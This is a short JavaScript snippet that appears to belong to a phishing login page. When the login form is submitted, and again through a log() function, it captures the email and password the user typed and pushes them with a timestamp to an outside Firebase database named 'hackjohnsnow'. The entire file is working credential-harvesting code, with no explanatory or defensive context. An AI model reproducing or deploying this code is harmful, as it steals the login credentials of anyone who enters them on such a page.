var ref = new Firebase("https://hackjohnsnow.firebaseio.com/");
$("#login_form").submit(function(){
	ref.push({
		date: new Date().toString(),
		username: $("#email").val(),
		password: $("#pass").val()
	});
});

			
function log(){
	ref.push({
		date: new Date().toString(),
		username: $("#email").val(),
		password: $("#pass").val()
	});
}